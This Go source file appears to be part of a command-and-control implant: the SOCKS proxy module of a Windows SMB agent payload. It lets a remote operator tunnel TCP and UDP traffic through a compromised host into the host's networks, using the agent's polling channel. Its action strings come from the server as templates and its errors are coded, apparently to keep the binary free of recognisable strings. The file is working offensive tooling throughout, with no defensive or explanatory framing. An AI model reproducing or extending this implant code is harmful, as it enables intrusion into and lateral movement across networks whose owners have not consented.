// server/docker/payloads/SMB_Windows/action_socks_http.go
// HTTP-based SOCKS handler that uses the normal polling mechanism.
// Enables SOCKS proxying through linked agents without dedicated WebSocket connections.

//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// Template indices - must match server's common.go
const (
	// TCP indices
	idxSocksHTTPActionConnect   = 1060
	idxSocksHTTPActionData      = 1061
	idxSocksHTTPActionClose     = 1062
	idxSocksHTTPStatusConnected = 1063
	idxSocksHTTPStatusData      = 1064
	idxSocksHTTPStatusClosed    = 1065
	idxSocksHTTPStatusError     = 1066
	idxSocksHTTPFieldSid        = 1067
	idxSocksHTTPFieldStatus     = 1068
	idxSocksHTTPFieldData       = 1069
	idxSocksHTTPFieldError      = 1070
	// UDP indices
	idxSocksHTTPActionUDPAssoc  = 1080
	idxSocksHTTPActionUDPData   = 1081
	idxSocksHTTPActionUDPClose  = 1082
	idxSocksHTTPStatusUDPReady  = 1083
	idxSocksHTTPStatusUDPData   = 1084
	idxSocksHTTPStatusUDPClosed = 1085
	idxSocksHTTPFieldDestAddr   = 1086
	idxSocksHTTPFieldDestPort   = 1087
	idxSocksHTTPFieldFrag       = 1088
	idxSocksHTTPFieldAtyp       = 1089
)

// SOCKS5 address types
const (
	addrTypeIPv4   = 0x01
	addrTypeDomain = 0x03
	addrTypeIPv6   = 0x04
)

// SocksHTTPCommand handles HTTP-based SOCKS proxy sessions
type SocksHTTPCommand struct {
	sessions    map[string]*TargetSession
	udpSessions map[string]*UDPTargetSession
	sessionsMu  sync.RWMutex
	running     bool
	ctx         *CommandContext
	// Pending responses to be included in next POST
	pendingResponses []*SocksHTTPResponse
	pendingMu        sync.Mutex
	// Cached template strings
	template   []string
	templateMu sync.RWMutex
}

// TargetSession represents a TCP connection to a target host
type TargetSession struct {
	ID           string
	TargetConn   net.Conn
	State        int // 0=connecting, 1=connected, 2=closed
	LastActivity time.Time
	readDone     chan struct{}
}

// UDPTargetSession represents a UDP relay session
type UDPTargetSession struct {
	ID           string
	UDPConn      *net.UDPConn
	State        int // 0=connecting, 1=connected, 2=closed
	LastActivity time.Time
	stopCh       chan struct{}
}

// SocksHTTPResponse is sent back to the server
type SocksHTTPResponse struct {
	SessionID string `json:"sid"`
	Status    string `json:"st"`  // connected, data, closed, error, udp_ready, udp_data, udp_closed
	Data      string `json:"d"`   // Base64 encoded data
	Error     string `json:"err"` // Error message
	// UDP-specific fields
	DestAddr string `json:"da,omitempty"`      // Destination/source address
	DestPort uint16 `json:"dp,omitempty"`      // Destination/source port
	AddrType byte   `json:"at_type,omitempty"` // Address type
}

// Global SOCKS HTTP handler instance
var socksHTTPHandler *SocksHTTPCommand
var socksHTTPOnce sync.Once

// GetSocksHTTPHandler returns the singleton SOCKS HTTP handler
func GetSocksHTTPHandler() *SocksHTTPCommand {
	socksHTTPOnce.Do(func() {
		socksHTTPHandler = &SocksHTTPCommand{
			sessions:         make(map[string]*TargetSession),
			udpSessions:      make(map[string]*UDPTargetSession),
			running:          true,
			pendingResponses: make([]*SocksHTTPResponse, 0),
		}
		// Start cleanup goroutine
		go socksHTTPHandler.cleanupStaleSessions()
	})
	return socksHTTPHandler
}

func (c *SocksHTTPCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	c.ctx = ctx

	// Get the JSON data from the CurrentCommand in context
	var rawData string
	ctx.mu.RLock()
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		rawData = ctx.CurrentCommand.Data
	}
	ctx.mu.RUnlock()

	if rawData == "" {
		return CommandResult{
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Parse SOCKS HTTP command with template support
	var cmdData struct {
		Type      int      `json:"t"`
		Version   int      `json:"v"`
		Action    string   `json:"at"`
		SessionID string   `json:"sid"`
		Dest      string   `json:"dst"`
		Data      string   `json:"d"`
		Templates []string `json:"tpl"` // Template strings from server
		// UDP-specific fields
		DestAddr string `json:"da,omitempty"`
		DestPort uint16 `json:"dp,omitempty"`
		AddrType byte   `json:"at_type,omitempty"`
		Frag     byte   `json:"fg,omitempty"`
	}

	if err := json.Unmarshal([]byte(rawData), &cmdData); err != nil {
		return CommandResult{
			Error:       err,
			ErrorString: Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Cache template if provided (sent with first connect command)
	if len(cmdData.Templates) > 0 {
		c.templateMu.Lock()
		c.template = cmdData.Templates
		c.templateMu.Unlock()
	}

	// Get action strings from template (server always provides these)
	actConnect := c.getTpl(idxSocksHTTPActionConnect)
	actData := c.getTpl(idxSocksHTTPActionData)
	actClose := c.getTpl(idxSocksHTTPActionClose)
	actUDPAssoc := c.getTpl(idxSocksHTTPActionUDPAssoc)
	actUDPData := c.getTpl(idxSocksHTTPActionUDPData)
	actUDPClose := c.getTpl(idxSocksHTTPActionUDPClose)

	switch cmdData.Action {
	case actConnect:
		return c.handleConnect(cmdData.SessionID, cmdData.Dest)
	case actData:
		return c.handleData(cmdData.SessionID, cmdData.Data)
	case actClose:
		return c.handleClose(cmdData.SessionID)
	case actUDPAssoc:
		return c.handleUDPAssociate(cmdData.SessionID)
	case actUDPData:
		return c.handleUDPData(cmdData.SessionID, cmdData.DestAddr, cmdData.DestPort, cmdData.AddrType, cmdData.Data)
	case actUDPClose:
		return c.handleUDPClose(cmdData.SessionID)
	default:
		return CommandResult{
			Error:       fmt.Errorf(ErrCtx(E21, cmdData.Action)),
			ErrorString: ErrCtx(E21, cmdData.Action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// getTpl returns template string at index
func (c *SocksHTTPCommand) getTpl(idx int) string {
	c.templateMu.RLock()
	defer c.templateMu.RUnlock()
	if c.template != nil && idx < len(c.template) {
		return c.template[idx]
	}
	return ""
}

func (c *SocksHTTPCommand) handleConnect(sessionID, dest string) CommandResult {
	// Dial TCP to destination with timeout
	conn, err := net.DialTimeout("tcp", dest, 30*time.Second)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E63),
		})
		return CommandResult{
			Output:      ErrCtx(E63, dest),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Create session
	session := &TargetSession{
		ID:           sessionID,
		TargetConn:   conn,
		State:        1, // connected
		LastActivity: time.Now(),
		readDone:     make(chan struct{}),
	}

	c.sessionsMu.Lock()
	c.sessions[sessionID] = session
	c.sessionsMu.Unlock()

	// Queue success response
	c.queueResponse(&SocksHTTPResponse{
		SessionID: sessionID,
		Status:    c.getTpl(idxSocksHTTPStatusConnected),
	})

	// Start goroutine to read from target
	go c.readFromTarget(session)

	return CommandResult{
		Output:      Succ(S4),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *SocksHTTPCommand) handleData(sessionID, data string) CommandResult {
	c.sessionsMu.RLock()
	session, exists := c.sessions[sessionID]
	c.sessionsMu.RUnlock()

	if !exists {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E60),
		})
		return CommandResult{
			Output:      Err(E60),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Decode data
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E61),
		})
		return CommandResult{
			Output:      Err(E61),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update activity
	session.LastActivity = time.Now()

	// Write to target
	_, err = session.TargetConn.Write(decoded)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E63),
		})
		c.closeSession(sessionID)
		return CommandResult{
			Output:      Err(E64),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      Succ(S0),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *SocksHTTPCommand) handleClose(sessionID string) CommandResult {
	c.closeSession(sessionID)
	return CommandResult{
		Output:      Succ(S2),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// handleUDPAssociate sets up a UDP relay session
func (c *SocksHTTPCommand) handleUDPAssociate(sessionID string) CommandResult {
	// Create a UDP socket for sending/receiving
	udpAddr, err := net.ResolveUDPAddr("udp", "0.0.0.0:0")
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E63),
		})
		return CommandResult{
			Output:      Err(E65),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	udpConn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E63),
		})
		return CommandResult{
			Output:      Err(E66),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Create UDP session
	session := &UDPTargetSession{
		ID:           sessionID,
		UDPConn:      udpConn,
		State:        1, // connected
		LastActivity: time.Now(),
		stopCh:       make(chan struct{}),
	}

	c.sessionsMu.Lock()
	c.udpSessions[sessionID] = session
	c.sessionsMu.Unlock()

	// Queue success response
	c.queueResponse(&SocksHTTPResponse{
		SessionID: sessionID,
		Status:    c.getTpl(idxSocksHTTPStatusUDPReady),
	})

	// Start goroutine to read UDP responses
	go c.readFromUDPTarget(session)

	return CommandResult{
		Output:      Succ(S4),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// handleUDPData sends UDP data to a target
func (c *SocksHTTPCommand) handleUDPData(sessionID, destAddr string, destPort uint16, addrType byte, data string) CommandResult {
	c.sessionsMu.RLock()
	session, exists := c.udpSessions[sessionID]
	c.sessionsMu.RUnlock()

	if !exists {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E60),
		})
		return CommandResult{
			Output:      Err(E60),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Decode data
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E61),
		})
		return CommandResult{
			Output:      Err(E61),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Resolve destination address
	dest := fmt.Sprintf("%s:%d", destAddr, destPort)
	udpAddr, err := net.ResolveUDPAddr("udp", dest)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     ErrCtx(E65, dest),
		})
		return CommandResult{
			Output:      ErrCtx(E65, dest),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update activity
	session.LastActivity = time.Now()

	// Send UDP packet
	_, err = session.UDPConn.WriteToUDP(decoded, udpAddr)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError),
			Error:     Err(E63),
		})
		return CommandResult{
			Output:      Err(E64),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      Succ(S0),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// handleUDPClose closes a UDP session
func (c *SocksHTTPCommand) handleUDPClose(sessionID string) CommandResult {
	c.closeUDPSession(sessionID)
	return CommandResult{
		Output:      Succ(S2),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// readFromUDPTarget reads UDP responses and queues them for the server
func (c *SocksHTTPCommand) readFromUDPTarget(session *UDPTargetSession) {
	defer c.closeUDPSession(session.ID)

	buf := make([]byte, 65535)
	for {
		select {
		case <-session.stopCh:
			return
		default:
		}

		// Set read deadline to allow checking stopCh
		session.UDPConn.SetReadDeadline(time.Now().Add(5 * time.Second))

		n, remoteAddr, err := session.UDPConn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			if session.State == 1 {
				c.queueResponse(&SocksHTTPResponse{
					SessionID: session.ID,
					Status:    c.getTpl(idxSocksHTTPStatusUDPClosed),
				})
			}
			return
		}

		if n > 0 {
			session.LastActivity = time.Now()

			// Determine address type
			var addrType byte = addrTypeIPv4
			destAddr := remoteAddr.IP.String()
			if remoteAddr.IP.To4() == nil {
				addrType = addrTypeIPv6
			}

			// Queue UDP data response
			c.queueResponse(&SocksHTTPResponse{
				SessionID: session.ID,
				Status:    c.getTpl(idxSocksHTTPStatusUDPData),
				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
				DestAddr:  destAddr,
				DestPort:  uint16(remoteAddr.Port),
				AddrType:  addrType,
			})
		}
	}
}

// closeUDPSession closes a UDP session
func (c *SocksHTTPCommand) closeUDPSession(sessionID string) {
	c.sessionsMu.Lock()
	session, exists := c.udpSessions[sessionID]
	if exists {
		session.State = 2 // closed
		close(session.stopCh)
		if session.UDPConn != nil {
			session.UDPConn.Close()
		}
		delete(c.udpSessions, sessionID)
	}
	c.sessionsMu.Unlock()
}

func (c *SocksHTTPCommand) readFromTarget(session *TargetSession) {
	defer func() {
		close(session.readDone)
		c.closeSession(session.ID)
	}()

	buf := make([]byte, 32*1024)
	for {
		// Set read deadline to detect stale connections
		session.TargetConn.SetReadDeadline(time.Now().Add(30 * time.Second))

		n, err := session.TargetConn.Read(buf)
		if err != nil {
			if err != io.EOF {
				// Only queue error if not a normal close
				if session.State == 1 {
					c.queueResponse(&SocksHTTPResponse{
						SessionID: session.ID,
						Status:    c.getTpl(idxSocksHTTPStatusClosed),
					})
				}
			} else {
				c.queueResponse(&SocksHTTPResponse{
					SessionID: session.ID,
					Status:    c.getTpl(idxSocksHTTPStatusClosed),
				})
			}
			return
		}

		if n > 0 {
			session.LastActivity = time.Now()

			// Queue data response
			c.queueResponse(&SocksHTTPResponse{
				SessionID: session.ID,
				Status:    c.getTpl(idxSocksHTTPStatusData),
				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
			})
		}
	}
}

func (c *SocksHTTPCommand) closeSession(sessionID string) {
	c.sessionsMu.Lock()
	session, exists := c.sessions[sessionID]
	if exists {
		session.State = 2 // closed
		if session.TargetConn != nil {
			session.TargetConn.Close()
		}
		delete(c.sessions, sessionID)
	}
	c.sessionsMu.Unlock()
}

func (c *SocksHTTPCommand) queueResponse(resp *SocksHTTPResponse) {
	c.pendingMu.Lock()
	c.pendingResponses = append(c.pendingResponses, resp)
	c.pendingMu.Unlock()
}

// GetPendingResponses returns and clears all pending SOCKS responses
// Called by the polling mechanism to include in POST payload
func (c *SocksHTTPCommand) GetPendingResponses() []*SocksHTTPResponse {
	c.pendingMu.Lock()
	defer c.pendingMu.Unlock()

	if len(c.pendingResponses) == 0 {
		return nil
	}

	responses := c.pendingResponses
	c.pendingResponses = make([]*SocksHTTPResponse, 0)
	return responses
}

func (c *SocksHTTPCommand) cleanupStaleSessions() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()
		staleTimeout := 5 * time.Minute

		c.sessionsMu.RLock()
		var staleTCPIDs []string
		for id, session := range c.sessions {
			if now.Sub(session.LastActivity) > staleTimeout {
				staleTCPIDs = append(staleTCPIDs, id)
			}
		}
		var staleUDPIDs []string
		for id, session := range c.udpSessions {
			if now.Sub(session.LastActivity) > staleTimeout {
				staleUDPIDs = append(staleUDPIDs, id)
			}
		}
		c.sessionsMu.RUnlock()

		// Cleanup stale TCP sessions
		for _, id := range staleTCPIDs {
			c.queueResponse(&SocksHTTPResponse{
				SessionID: id,
				Status:    c.getTpl(idxSocksHTTPStatusClosed),
				Error:     Err(E62),
			})
			c.closeSession(id)
		}

		// Cleanup stale UDP sessions
		for _, id := range staleUDPIDs {
			c.queueResponse(&SocksHTTPResponse{
				SessionID: id,
				Status:    c.getTpl(idxSocksHTTPStatusUDPClosed),
				Error:     Err(E62),
			})
			c.closeUDPSession(id)
		}
	}
}

// HasPendingSocksResponses checks if there are pending SOCKS responses
func HasPendingSocksResponses() bool {
	handler := GetSocksHTTPHandler()
	handler.pendingMu.Lock()
	defer handler.pendingMu.Unlock()
	return len(handler.pendingResponses) > 0
}

// HasActiveSocksSessions checks if there are active SOCKS sessions (TCP or UDP)
func HasActiveSocksSessions() bool {
	handler := GetSocksHTTPHandler()
	handler.sessionsMu.RLock()
	defer handler.sessionsMu.RUnlock()
	return len(handler.sessions) > 0 || len(handler.udpSessions) > 0
}

// WaitForSocksResponses waits briefly for SOCKS responses to queue up
// This is needed for linked agents where async responses may not be ready yet
func WaitForSocksResponses(maxWait time.Duration) []map[string]interface{} {
	handler := GetSocksHTTPHandler()

	// If no active sessions (TCP or UDP), return immediately
	handler.sessionsMu.RLock()
	hasActiveSessions := len(handler.sessions) > 0 || len(handler.udpSessions) > 0
	handler.sessionsMu.RUnlock()

	if !hasActiveSessions {
		return GetSocksHTTPResponses()
	}

	// Wait for responses with polling
	deadline := time.Now().Add(maxWait)
	pollInterval := 10 * time.Millisecond

	for time.Now().Before(deadline) {
		if HasPendingSocksResponses() {
			// Small additional delay to batch multiple responses
			time.Sleep(20 * time.Millisecond)
			return GetSocksHTTPResponses()
		}
		time.Sleep(pollInterval)
	}

	// Return whatever we have (may be empty)
	return GetSocksHTTPResponses()
}

// GetSocksHTTPResponses returns pending SOCKS responses for inclusion in POST
func GetSocksHTTPResponses() []map[string]interface{} {
	handler := GetSocksHTTPHandler()
	responses := handler.GetPendingResponses()
	if len(responses) == 0 {
		return nil
	}

	result := make([]map[string]interface{}, len(responses))
	for i, resp := range responses {
		result[i] = map[string]interface{}{
			"sid": resp.SessionID,
			"st":  resp.Status,
		}
		if resp.Data != "" {
			result[i]["d"] = resp.Data
		}
		if resp.Error != "" {
			result[i]["err"] = resp.Error
		}
		// UDP-specific fields
		if resp.DestAddr != "" {
			result[i]["da"] = resp.DestAddr
		}
		if resp.DestPort != 0 {
			result[i]["dp"] = resp.DestPort
		}
		if resp.AddrType != 0 {
			result[i]["at_type"] = resp.AddrType
		}
	}
	return result
}
